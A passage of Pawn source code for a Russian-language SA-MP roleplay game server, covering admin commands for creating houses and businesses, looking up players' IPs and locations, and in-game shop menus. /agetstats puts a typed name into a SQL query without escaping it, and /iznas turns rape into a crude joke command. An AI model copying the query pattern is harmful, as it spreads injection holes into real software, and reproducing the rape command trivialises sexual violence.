		SetPVarInt(playerid,"st_object",stobject);
		EditDynamicObject(playerid,stobject);
		SCM(playerid,COLOR_GREEN,"Поставьте банкомат на нужное место. {ffffff}Для продолжения введите команду ещё раз");
	}
	else ShowPlayerDialogEx(playerid, 1883, DIALOG_STYLE_MSGBOX, "Банкоматы", "Продолжить изменять положение объекта", "Да", "Нет");
	return true;
}
CMD:addhouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1]))
	{
		SCM(playerid, -1, " Введите: /addhouse [класс] [цена]");
		SCM(playerid,-1,"0 - [Nope] | 1 - [D] | 2 - [C] | 3 - [B] | 4 - [A]");
		return true;
	}
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY, 256, "INSERT INTO `house` (`hEntrancex`, `hEntrancey`,`hEntrancez`, `hLock`,`hKlass`) VALUES ('%f', '%f', '%f', '1','%i')",posX,posY,posZ,params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalHouse++;
	HouseInfo[TotalHouse][hID] = TotalHouse;
	HouseInfo[TotalHouse][hEntrancex] = posX;
	HouseInfo[TotalHouse][hEntrancey] = posY;
	HouseInfo[TotalHouse][hEntrancez] = posZ;
	HouseInfo[TotalHouse][hLock] = 1;
	HouseInfo[TotalHouse][hKlass] = params[0];
	HouseInfo[TotalHouse][hValue] = params[1];
	if(HouseInfo[TotalHouse][hKlass] == 0)
	{
		HouseInfo[TotalHouse][hInt] = 10;
		HouseInfo[TotalHouse][hExitx] = 421.7613;
		HouseInfo[TotalHouse][hExity] = 2536.4836;
		HouseInfo[TotalHouse][hExitz] = 10.0000;
	}
	else if(HouseInfo[TotalHouse][hKlass] == 1)
	{
		HouseInfo[TotalHouse][hInt] = 6;
		HouseInfo[TotalHouse][hExitx] = -68.8618;
		HouseInfo[TotalHouse][hExity] = 1352.2183;
		HouseInfo[TotalHouse][hExitz] = 1080.2109;
	}
	else if(HouseInfo[TotalHouse][hKlass] == 2)
	{
		HouseInfo[TotalHouse][hInt] = 5;
		HouseInfo[TotalHouse][hExitx] = 22.7405;
		HouseInfo[TotalHouse][hExity] = 1404.3799;
		HouseInfo[TotalHouse][hExitz] = 1084.4297;
	}
	else if(HouseInfo[TotalHouse][hKlass] == 3)
	{
		HouseInfo[TotalHouse][hInt] = 12;
		HouseInfo[TotalHouse][hExitx] = 2324.3367;
		HouseInfo[TotalHouse][hExity] = -1148.6296;
		HouseInfo[TotalHouse][hExitz] = 1050.7101;
	}
	else
	{
		HouseInfo[TotalHouse][hInt] = 5;
		HouseInfo[TotalHouse][hExitx] = 140.2206;
		HouseInfo[TotalHouse][hExity] = 1367.2734;
		HouseInfo[TotalHouse][hExitz] = 1083.8612;
	}
	HouseInfo[TotalHouse][hPickup] = CreatePickupAC(1273, 23, HouseInfo[TotalHouse][hEntrancex], HouseInfo[TotalHouse][hEntrancey], HouseInfo[TotalHouse][hEntrancez],-1);
	HouseInfo[TotalHouse][hMIcon] = CreateDynamicMapIcon(HouseInfo[TotalHouse][hEntrancex], HouseInfo[TotalHouse][hEntrancey], HouseInfo[TotalHouse][hEntrancez], 31, -1, 0, -1, -1,150);
	SCM(playerid,-1," Вы создали дом. Используйте /sethousecarpos (Указать позицию авто)");
	BuyHouse(TotalHouse);
	return true;
}
CMD:addcbar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addcbar [цена] [название]");
	mysql_format(DATABASE,QUERY, 256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`,`bBarX`,`bBarY`,`bBarZ`) VALUES ('1903.6458', '964.9723', '10.8203', '1','0', '1946.2197','1017.7030','992.4688')");
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = 1903.6458;
	BizzInfo[TotalBizz][bEntranceY] = 964.9723;
	BizzInfo[TotalBizz][bEntranceZ] = 10.8203;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 5;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	SCM(playerid,-1," Вы создали бар для казино Four Dragons");
	return true;
}
CMD:addsbizz(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addsbizz [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY, 256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 4;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	SCM(playerid,-1," Вы создали заправку..");
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage],BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	return true;
}
CMD:addeat(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addeat [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY,256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bVirtualWorld] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 2;
	BizzInfo[TotalBizz][bInterior] = 10;
	BizzInfo[TotalBizz][bExitX] = 362.919;
	BizzInfo[TotalBizz][bExitY] = -75.207;
	BizzInfo[TotalBizz][bExitZ] = 1001.51;
	BizzInfo[TotalBizz][bBarX] = 377.075;
	BizzInfo[TotalBizz][bBarY] = -67.4374;
	BizzInfo[TotalBizz][bBarZ] = 1001.51;
	BizzInfo[TotalBizz][bPrice] = 0;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	BizzInfo[TotalBizz][bEnterPic] = CreatePickupAC(1318, 23, BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],-1);
	BizzInfo[TotalBizz][bExitPic] = CreatePickupAC(1318, 23, BizzInfo[TotalBizz][bExitX], BizzInfo[TotalBizz][bExitY], BizzInfo[TotalBizz][bExitZ],BizzInfo[TotalBizz][bVirtualWorld]);
	PickupX[playerid] = BizzInfo[TotalBizz][bEntranceX], PickupY[playerid] = BizzInfo[TotalBizz][bEntranceY];
	oldpickup[playerid] = BizzInfo[TotalBizz][bEnterPic];
	timepickup[playerid] = 8;
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage], BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	SCM(playerid,-1," Вы создали закусочную");
	return true;
}
CMD:addpizza(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addpizza [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY,256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bVirtualWorld] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 2;
	BizzInfo[TotalBizz][bInterior] = 5;
	BizzInfo[TotalBizz][bExitX] = 372.36;
	BizzInfo[TotalBizz][bExitY] = -133.521;
	BizzInfo[TotalBizz][bExitZ] = 1001.49;
	BizzInfo[TotalBizz][bBarX] = 375.888;
	BizzInfo[TotalBizz][bBarY] = -118.817;
	BizzInfo[TotalBizz][bBarZ] = 1001.5;
	BizzInfo[TotalBizz][bPrice] = 0;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	BizzInfo[TotalBizz][bEnterPic] = CreatePickupAC(1318, 23, BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],-1);
	BizzInfo[TotalBizz][bExitPic] = CreatePickupAC(1318, 23, BizzInfo[TotalBizz][bExitX], BizzInfo[TotalBizz][bExitY], BizzInfo[TotalBizz][bExitZ],BizzInfo[TotalBizz][bVirtualWorld]);
	PickupX[playerid] = BizzInfo[TotalBizz][bEntranceX], PickupY[playerid] = BizzInfo[TotalBizz][bEntranceY];
	oldpickup[playerid] = BizzInfo[TotalBizz][bEnterPic];
	timepickup[playerid] = 8;
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage], BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	SCM(playerid,-1," Вы создали пиццерию");
	return true;
}
CMD:addshop(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addshop [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY,256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bVirtualWorld] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 3;
	BizzInfo[TotalBizz][bInterior] = 6;
	BizzInfo[TotalBizz][bExitX] = -2240.4685;
	BizzInfo[TotalBizz][bExitY] = 137.0604;
	BizzInfo[TotalBizz][bExitZ] = 1035.4140;
	BizzInfo[TotalBizz][bBarX] = -2236.1130;
	BizzInfo[TotalBizz][bBarY] = 130.1580;
	BizzInfo[TotalBizz][bBarZ] = 1035.4141;
	BizzInfo[TotalBizz][bPrice] = 0;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	BizzInfo[TotalBizz][bEnterPic] = CreatePickupAC(1318, 23, BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],-1);
	BizzInfo[TotalBizz][bExitPic] = CreatePickupAC(1318, 23, BizzInfo[TotalBizz][bExitX], BizzInfo[TotalBizz][bExitY], BizzInfo[TotalBizz][bExitZ],BizzInfo[TotalBizz][bVirtualWorld]);
	PickupX[playerid] = BizzInfo[TotalBizz][bEntranceX], PickupY[playerid] = BizzInfo[TotalBizz][bEntranceY];
	oldpickup[playerid] = BizzInfo[TotalBizz][bEnterPic];
	timepickup[playerid] = 8;
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage], BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	SCM(playerid,-1," Вы создали 24-7.");
	return true;
}
CMD:getip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid,-1, " Введите: /getip [id/ник]");
	new ip[15];
	GetPlayerIp(params[0],ip,15);
	format(YCMDstr, sizeof(YCMDstr), " Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PlayerInfo[params[0]][pIpReg],PlayerInfo[params[0]][pvIp],ip);
	SCM(playerid,COLOR_BLUE,YCMDstr);
	return true;
}
CMD:geoinfo(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
    if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /geoinfo [id игрока]");
    
	new regcountry[20], regcity[30], regprovider[30];
    GetIPCountry(PlayerInfo[params[0]][pIpReg], regcountry);
	GetIPCity(PlayerInfo[params[0]][pIpReg], regcity);
	GetIPISP(PlayerInfo[params[0]][pIpReg], regprovider);
	new nowcountry[20], nowcity[30], nowprovider[30];
	GetPlayerCountry(params[0], nowcountry);
	GetPlayerCity(params[0], nowcity);
	GetPlayerISP(params[0], nowprovider);
	new nowip[16];
 	GetPlayerIp(playerid, nowip, sizeof(nowip));

	format(string, 500,
	"{FFFFFF}Проверка игрока: {ff9300}%s[%d]{FFFFFF}\n\n\
	Дата при регистрации: %s\n\
	IP при регистрации: %s\n\
	Страна при регистрации: %s\n\
	Город при регистрации: %s\n\
	Провайдер при регистрации: %s\n\n\
	Текущий IP: %s\n\
	Текущая страна: %s\n\
	Текущий город: %s\n\
	Текущий провайдер: %s",
	PlayerInfo[params[0]][pName], params[0],
	PlayerInfo[params[0]][pDataReg],
	PlayerInfo[params[0]][pIpReg],
	regcountry,
	regcity,
	regprovider,
	nowip,
	nowcountry,
	nowcity,
	nowprovider);
	return ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, !"{AE433D}Сравнение регистрационных данных с текущими", string, !"Закрыть", "");
}
CMD:pchat(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "is[128]",params[0], params[1])) return SCM(playerid, -1, " Введите: /pchat [playerid] [text]");
	OnPlayerText(params[0], params[1]);
	return true;
}
CMD:pcmd(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "is[128]",params[0], params[1])) return SCM(playerid, -1, " Введите: /pcmd [playerid] [text]");
	DC_CMD(params[0], params[1]);
	return true;
}
CMD:getstats(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /getstats [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerInfo[playerid][pAdmin] > 1 && PlayerInfo[playerid][pAdmin] < 2) return ShowStats(playerid,params[0]);
	if(PlayerInfo[playerid][pAdmin] > 3) return kShowStats(playerid,params[0]);
	return true;
}
CMD:stats(playerid)
{
	ShowStats(playerid, playerid);
	return true;
}
CMD:myhhouse(playerid, params[])
{
	format(YCMDstr, sizeof(YCMDstr), " my house: %d",PlayerInfo[playerid][pPHouseKey]);
	SCM(playerid,COLOR_BLUE,YCMDstr);
	return true;
}
CMD:fractionid(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	LeaderList(playerid);
	return true;
}
CMD:iwep(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	new giveplayerid;
	if(sscanf(params, "u",giveplayerid)) return  	SCM(playerid, -1, " Введите: /iwep [playerid]");
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			new Gun[13], Ammo[13], wep[450];
			GetPlayerWeaponData(giveplayerid,0,Gun[0],Ammo[0]);
			GetPlayerWeaponData(giveplayerid,1,Gun[1],Ammo[1]);
			GetPlayerWeaponData(giveplayerid,2,Gun[2],Ammo[2]);
			GetPlayerWeaponData(giveplayerid,3,Gun[3],Ammo[3]);
			GetPlayerWeaponData(giveplayerid,4,Gun[4],Ammo[4]);
			GetPlayerWeaponData(giveplayerid,5,Gun[5],Ammo[5]);
			GetPlayerWeaponData(giveplayerid,6,Gun[6],Ammo[6]);
			GetPlayerWeaponData(giveplayerid,7,Gun[7],Ammo[7]);
			GetPlayerWeaponData(giveplayerid,8,Gun[8],Ammo[8]);
			GetPlayerWeaponData(giveplayerid,9,Gun[9],Ammo[9]);
			GetPlayerWeaponData(giveplayerid,10,Gun[10],Ammo[10]);
			GetPlayerWeaponData(giveplayerid,11,Gun[11],Ammo[11]);
			GetPlayerWeaponData(giveplayerid,12,Gun[12],Ammo[12]);
			format(wep,sizeof(wep),
			"{ff00ff}State:   %s\n\n\
			0: Ид оружия: %i    Патрон: %i\
			\n1: Ид оружия: %i    Патрон: %i\
			\n2: Ид оружия: %i    Патрон: %i\
			\n3: Ид оружия: %i    Патрон: %i\
			\n4: Ид оружия: %i    Патрон: %i\
			\n5: Ид оружия: %i    Патрон: %i\
			\n6: Ид оружия: %i    Патрон: %i\
			\n7: Ид оружия: %i    Патрон: %i\
			\n8: Ид оружия: %i    Патрон: %i\
			\n9: Ид оружия: %i    Патрон: %i\
			\n10: Ид оружия: %i    Патрон: %i\
			\n11: Ид оружия: %i    Патрон: %i\
			\n12: Ид оружия: %i    Патрон: %i"
			, PlayerInfo[giveplayerid][pName], Gun[0], Ammo[0], Gun[1], Ammo[1], Gun[2], Ammo[2], Gun[3], Ammo[3], Gun[4], Ammo[4], Gun[5], Ammo[5], Gun[6], Ammo[6], Gun[7], Ammo[7], Gun[8], Ammo[8], Gun[9], Ammo[9], Gun[10], Ammo[10], Gun[11], Ammo[11], Gun[12], Ammo[12]);
			ShowPlayerDialogEx(playerid,999,DIALOG_STYLE_MSGBOX,"Информация оружия",wep,"Закрыть","");
		}
	}
	else return SCM(playerid, COLOR_GREY, " Игрок не найден!");
	return true;
}
CMD:agetstats(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new name[64];
	if(sscanf(params, "s[64]", name)) return SCM(playerid, -1, " Введите: /agetstats [ник игрока]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",name);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",16,playerid,name);
	return true;
}
CMD:number(playerid, params[])
{
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /number [id]");
	if(!IsPlayerConnected(params[0])) return true;
	format(YCMDstr, 256, " Имя: %s, телефон: %i",Name(params[0]),PlayerInfo[params[0]][pPnumber]);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:bizfee(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GRAD2, "У вас нет бизнеса!");
	new bouse = PlayerInfo[playerid][pPBizzKey];
	if(sscanf(params, "d",params[0])) return 	SCM(playerid, -1, " Введите: /bizfee [цена]");
	if(params[0] < 50 || params[0] > 5000) return SCM(playerid, COLOR_GREY, " Минимальная цена 50, Максимальная 5000 вирт");
	BizzInfo[bouse][bPrice] = params[0];
	format(YCMDstr, sizeof(YCMDstr), " Цена за товар установлена на %i вирт", BizzInfo[bouse][bPrice]);
	SCM(playerid, -1, YCMDstr);
	if(BizzInfo[bouse][bType] == 4)
	{
		format(string,128, "%s\nВладелец:\n%s\nЦена бензина: %i вирт", BizzInfo[bouse][bMessage], BizzInfo[bouse][bOwner],BizzInfo[bouse][bPrice]);
		UpdateDynamic3DTextLabelText(BizzInfo[bouse][bLabel], COLOR_GREEN, string);
	}
	return true;
}
CMD:eat(playerid, params[])
{
	for(new h = 1; h <= TotalBizz; h++)
	{
		if(!PlayerToPoint(10, playerid,BizzInfo[h][bBarX], BizzInfo[h][bBarY], BizzInfo[h][bBarZ]) || BizzInfo[h][bType] != 2 || GetPlayerVirtualWorld(playerid) != BizzInfo[h][bVirtualWorld]) continue;
		if(strcmp(BizzInfo[h][bOwner],"None",true) == 0 || BizzInfo[h][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
		if(GetPlayerInterior(playerid) == 10 || GetPlayerInterior(playerid) == 4) format(YCMDstr,sizeof(YCMDstr), "Бургер\t\t\t\t[%i вирт]\nРыбный суп\t\t\t[%i вирт]\nБольшой бургер\t\t[%i вирт]\nКотлеты\t\t\t[%i вирт]\
		\nПельмени\t\t\t[%i вирт]\nГамбургер\t\t\t[%i вирт]",BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3);
		else format(YCMDstr,sizeof(YCMDstr), "Пицца маленькая\t\t[%i вирт]\nПицца с грибами\t\t[%i вирт]\nПицца с сыром\t\t[%i вирт]\nПицца большая\t\t[%i вирт]\
		\nПицца с ветчиной\t\t[%i вирт]\nПицца с куринным мясом\t[%i вирт]",BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3);
		ShowPlayerDialogEx(playerid, 3389, DIALOG_STYLE_LIST, "Меню", YCMDstr, "Выбрать", "Отмена");
	}
	return true;
}
CMD:buy(playerid, params[])
{
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(!PlayerToPoint(10, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) || BizzInfo[i][bType] != 3 || GetPlayerVirtualWorld(playerid) != BizzInfo[i][bVirtualWorld]) continue;
		if(strcmp(BizzInfo[i][bOwner],"None",true) == 0 || BizzInfo[i][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
		if(BizzInfo[i][bProducts] <= 0) return SCM(playerid,COLOR_GREY," В бизнесе нет продуктов"), BizzInfo[i][bProducts] = 0;
		format(string,300,"Номер телефона:\t[%i вирт]\nСправочник:\t\t[%i вирт]\nАптечки(25шт.):\t\t[%i вирт]\nФотоаппарат:\t\t[%i вирт]\nЦветы:\t\t\t[%i вирт]\nУдочка:\t\t[%i вирт]\nСнасти(10шт.):\t\t[%i вирт]\nСонар:\t\t\t[%i вирт]",BizzInfo[i][bPrice],BizzInfo[i][bPrice]*2,
		BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*4,BizzInfo[i][bPrice]*4,BizzInfo[i][bPrice]*5);
		ShowPlayerDialogEx(playerid, 5589, DIALOG_STYLE_LIST, "24/7", string, "Купить", "Отмена");
	}
	return true;
}
CMD:drink(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(!PlayerToPoint(10, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) || BizzInfo[i][bType] != 1 || GetPlayerVirtualWorld(playerid) != BizzInfo[i][bVirtualWorld]) continue;
		if(strcmp(BizzInfo[i][bOwner],"None",true) == 0 || BizzInfo[i][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
		format(YCMDstr,sizeof(YCMDstr), "Вода\t\t[%i вирт]\nСода\t\t[%i вирт]\nТоник\t\t[%i вирт]\nКока-кола\t[%i вирт]\nПиво\t\t[%i вирт]\nСаке\t\t[%i вирт]\nВодка\t\t[%i вирт]\nВино\t\t[%i вирт]\nВиски\t\t[%i вирт]\nКоньяк\t\t[%i вирт]\nАбсент\t\t[%i вирт]",
		BizzInfo[i][bPrice],BizzInfo[i][bPrice],BizzInfo[i][bPrice],BizzInfo[i][bPrice]*2,BizzInfo[i][bPrice]*2,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*4,BizzInfo[i][bPrice]*5,BizzInfo[i][bPrice]*5,BizzInfo[i][bPrice]*6);
		ShowPlayerDialogEx(playerid, 2289, DIALOG_STYLE_LIST, "Меню Бара", YCMDstr, "Выбрать", "Отмена");
	}
	return true;
}
CMD:gps(playerid)
{
	if(CP[playerid] == 776) { DisablePlayerCheckpoint(playerid), CP[playerid] = 0; }
	ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Назад");
	return true;
}
CMD:iznas(playerid, params[])
{
    if(Flood[playerid] > 0)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
  		if(GetPVarInt(playerid,"Flood") >= 5) kick(playerid);
  		SendClientMessage(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
    if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, " Нельзя использовать в машине");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, -1, " Введите: /iznas [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(params[0] == playerid) return SendClientMessage(playerid,COLOR_GREY, " [Ошибка] Вы указали свой ID");
	if(PlayerInfo[playerid][pHP] < 25) return SendClientMessage(playerid,COLOR_GREY, " У жертвы болит анус! Его нельзя насиловать!");
	if(PlayerInfo[params[0]][pAdmin] > PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid,COLOR_GREY, " Его нельзя");
	new Float:angle;
	SetPlayerHealthAC(playerid, health - 25.0);
	PlayerInfo[playerid][pHP] -= 25;
	GetPlayerFacingAngle(playerid, angle);
	SetPlayerFacingAngle(params[0], angle + 180);
	SendClientMessage(playerid, 0x00AB06AA, " Вы изнасиловали прохожего. Жертва сильно ударила вас {FFFFFF}(( - 25 хп ))");
	SendClientMessage(params[0], 0xC42100AA, " Вас изнасиловал маньяк");
	format(YCMDstr, sizeof(YCMDstr), " %s изнасиловал(а) %s",Name(playerid) ,Name(params[0]));
	ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	ApplyAnimation(params[0], "SNM", "SPANKINGW",4.1,0,1,1,1,1,1);
	ApplyAnimation(playerid, "SNM", "SPANKEDW",4.1,0,1,1,1,1,1);
	Flood[playerid] = 2;
	SetPVarInt(playerid,"Flood",0);
	PlayerInfo[playerid][pWantedLevel]++;
	SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWantedLevel]);
	SetPlayerCriminal(playerid,"Неизвестный", "Изнасилование");
	return true;
}
CMD:ooc(playerid, params[])
{
